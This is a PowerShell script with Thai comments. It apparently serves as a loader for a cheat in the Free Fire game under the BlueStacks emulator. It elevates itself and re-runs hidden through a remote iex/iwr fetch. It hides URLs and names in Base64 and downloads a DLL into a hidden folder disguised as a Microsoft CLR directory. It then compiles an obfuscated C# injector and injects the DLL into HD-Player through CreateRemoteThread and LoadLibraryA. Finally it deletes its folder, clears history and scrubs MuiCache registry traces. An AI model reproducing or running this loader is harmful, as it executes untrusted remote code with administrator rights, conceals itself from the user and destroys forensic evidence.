# 1. เช็คสิทธิ์ Admin
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# 2. ซ่อนข้อความสำคัญด้วยการถอดรหัส Base64 ในตอนรัน
# URL เดิม: https://github.com/potae112/Cmdfreefire/releases/download/v1.0/AimbotFemaleFix.dll
$u_b64 = "aHR0cHM6Ly9naXRodWIuY29tL3BvdGFlMTEyL0NtZGZyZWVmaXJlL3JlbGVhc2VzL2Rvd25sb2FkL3YxLjAvQWltYm90RmVtYWxlRml4LmRsbA=="
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u_b64))

# ชื่อไฟล์และโฟลเดอร์พรางตา
$fakeName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNjb3JpZXMuZGxs")) # mscories.dll
$workDir = Join-Path $env:LOCALAPPDATA ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWljcm9zb2Z0XENMUl92NC4w"))) # Microsoft\CLR_v4.0
$dllPath = Join-Path $workDir $fakeName
$targetProcess = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SEQtUGxheWVy")) # HD-Player

# 3. เตรียมโฟลเดอร์ซ่อน
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
attrib +h +s $workDir

# 4. ดาวน์โหลดไฟล์
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue

# 5. โค้ด C# ที่บีบอัดเป็นบรรทัดเดียวและเข้ารหัส Base64 (ซ่อน Injector Source)
$csharp_b64 = "dXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczt1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7dXNpbmcgU3lzdGVtLlRleHQ7cHVibGljIGNsYXNzIEluamVjdG9ye1tEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBPcGVuUHJvY2VzcyhpbnQgYSwgYm9vbCBiLCBpbnQgYyk7W0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldE1vZHVsZUhhbmRsZShzdHJpbmcgZCk7W0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBlLCBzdHJpbmcgZik7W0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4KEludFB0ciBnLCBJbnRQdHIgaCwgdWludCBpLCB1aW50IGosIHVpbnQgayk7W0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZVByb2Nlc3NNZW1vcnkoSW50UHRyIGwsIEludFB0ciBtLCBieXRlW10gbiwgdWludCBvLCBvdXQgSW50UHRyIHApO1tEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVSZW1vdGVUaHJlYWQoSW50UHRyIHEsIEludFB0ciByLCB1aW50IHMsIEludFB0ciB0LCBJbnRQdHIgdSwgdWludCB2LCBJbnRQdHIgdyk7cHVibGljIHN0YXRpYyB2b2lkIEluamVjdChpbnQgeCwgc3RyaW5nIHkpIHtJbnRQdHIgaCA9IE9wZW5Qcm9jZXNzKDB4MDAxRjBGRkYsIGZhbHNlLCB4KTtJbnRQdHIgYSA9IFZpcnR1YWxBbGxvY0V4KGgsIEludFB0ci5aaXJvLCAodWludCkoKHkubGVuZ3RoICsgMSkgKiBNYXJzaGFsLlNpemVPZih0eXBlb2YoY2hhcikpKSwgMHgzMDAwLCAweDQwKTtJbnRQdHIgbyA7IFdyaXRlUHJvY2Vzc01lbW9yeShoLCBhLCBFbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKHkpLCAodWludCkoKHkubGVuZ3RoICsgMSkgKiBNYXJzaGFsLlNpemVPZih0eXBlb2YoY2hhcikpKSwgb3V0IG8pO0ludFB0ciBsID0gR2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKCJrZXJuZWwzMi5kbGwiKSwgIkxvYWRMaWJyYXJ5QSIpO0NyZWF0ZVJlbW90ZVRocmVhZChoLCBJbnRQdHIuWmlybywgMCwgbCwgYSwgMCwgSW50UHRyLlppcm8pO319"
$Source = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($csharp_b64))

# 6. ตรวจสอบโปรเซสและรัน Injector
if (Test-Path $dllPath) {
    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
    if (!$proc) {
        $path_emu = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QzpcUHJvZ3JhbSBGaWxlc1xCbHVlU3RhY2tzX254dFxIRC1QbGF5ZXIuZXhl"))
        Start-Process $path_emu
        Start-Sleep -Seconds 6
        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
    }

    if ($proc) {
        Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
        [Injector]::Inject($proc.Id, $dllPath)
    }
}

# 7. ลบร่องรอย
Start-Sleep -Seconds 5
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue

$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
}